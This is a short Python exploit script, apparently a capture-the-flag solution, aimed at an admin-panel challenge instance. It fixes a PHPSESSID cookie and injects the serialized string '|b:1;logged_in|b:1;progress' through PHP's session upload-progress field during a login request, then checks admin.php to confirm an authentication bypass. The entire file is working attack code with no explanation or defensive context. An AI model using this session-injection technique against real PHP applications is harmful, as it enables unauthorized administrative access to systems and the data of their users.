import requests
import urllib.parse

BASE_URL = "https://admin-panel-489a10b9570c.instancer.sekai.team"
host = urllib.parse.urlparse(BASE_URL).hostname
sess = requests.Session()
sess.cookies.set("PHPSESSID", "osuadminpwnd", domain=host, path="/")

payload = "|b:1;logged_in|b:1;progress"
files = {
    "PHP_SESSION_UPLOAD_PROGRESS": (None, payload),
    "username": (None, "peppy"),
    "password": (None, "anything"),
    "file": ("dummy.txt", "osu!", "text/plain"),
}

resp = sess.post(f"{BASE_URL}/login.php", files=files, allow_redirects=False)
print("Status:", resp.status_code)
print("Set-Cookie:", resp.headers.get("Set-Cookie"))
print("Session cookies:", sess.cookies.get_dict(domain=host))

resp2 = sess.get(f"{BASE_URL}/admin.php", allow_redirects=False)
print("Admin status:", resp2.status_code, resp2.headers.get("Location"))
print("Session cookies after admin:", sess.cookies.get_dict(domain=host))
